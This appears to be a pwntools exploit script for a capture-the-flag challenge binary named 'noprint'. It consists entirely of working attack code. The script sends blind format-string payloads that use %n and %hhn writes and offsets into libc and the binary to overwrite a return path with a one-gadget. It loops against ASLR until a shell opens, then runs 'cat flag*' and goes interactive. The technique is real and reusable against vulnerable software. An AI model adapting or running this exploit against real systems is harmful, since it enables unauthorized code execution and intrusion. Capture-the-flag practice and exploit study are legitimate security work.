from pwn import *
from icecream import ic

elf = exe = ELF("./noprint_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *main+157
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a, timeout=3)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

while True:
    try:
        io = start()
        ru("Hello from the void\n")
        payload = "%*11$d" + "%11$n"
        sl(payload)
        time.sleep(1)
        sl(f'%{0xa8 - 0x80}c%11$hhn')
        time.sleep(1)
        libc_to_gadget = 0xf6392 - 0x2a3b8

        addr = 0xd8 - 0x80
        payload = f"%{addr-9}c" + "%c"*9 + "%hhn" + "%*12$d" + "%{}c".format(libc_to_gadget - addr) + "%31$n"
        sl(payload)
        time.sleep(1)

        elf_to_init = 0x00005555555552a5-0x0000555555555120
        # elf_to_init = 0
        addr = 0x98 - 0x80
        payload = f"%{addr-9}c" + "%c"*9 + "%hhn" + "%*39$d" + "%{}c".format(elf_to_init - addr) + "%31$n"
        sl(payload)
        time.sleep(1)
        try:
            sl("cat flag*")
            flag = ru("}")
            ic(flag)
            if flag == b"":
                io.close()
                continue
            else:
                ic(flag)
                io.interactive()
        except EOFError:
            io.close()
            continue
    except EOFError:
        io.close()
        continue


io.interactive()
